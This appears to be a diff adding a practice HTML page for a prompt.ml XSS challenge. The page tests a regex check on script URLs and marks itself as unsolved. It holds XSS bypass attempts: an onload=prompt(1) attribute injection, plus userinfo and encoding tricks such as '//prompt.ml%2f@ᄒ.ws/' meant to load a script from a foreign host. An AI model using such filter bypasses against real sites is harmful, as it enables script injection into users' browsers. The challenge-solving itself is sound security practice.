@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+</head>
+
+<body>
+    <title></title>
+    <h1></h1>
+    <div id="body">
+        <!-- <script src="https://prompt.ml/js/test.js" onload=prompt(1)></script> -->
+    </div>
+    <script>
+        // 未解決
+        function escape(input) {
+            // make sure the script belongs to own site
+            // sample script: http://prompt.ml/js/test.js
+            // ref:https://www.runoob.com/jsref/jsref-decodeuricomponent.html
+            if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {
+                console.log(input);
+                var script = document.createElement('script');
+                script.src = input;
+                return script.outerHTML;
+            } else {
+                return 'Invalid resource.';
+            }
+        }
+        // var input = "https://prompt.ml/js/test.js \"onload=prompt(1)\"";
+        // intput = encodeURIComponent(input);
+        // console.log(input);
+        // var input = "https%3A%2F%2Fprompt.ml%2Fjs%2Ftest.js%20%22onload%3Dprompt(1)%22";
+        // var input = "//prompt.ml%2f@ᄒ.ws/✌";
+        var input = "https://prompt.ml/@www.baidu.com"
+        var body = document.getElementById("body");
+        body.innerHTML = escape(input);
+        
+    </script>
+
+</body>
+
+</html>
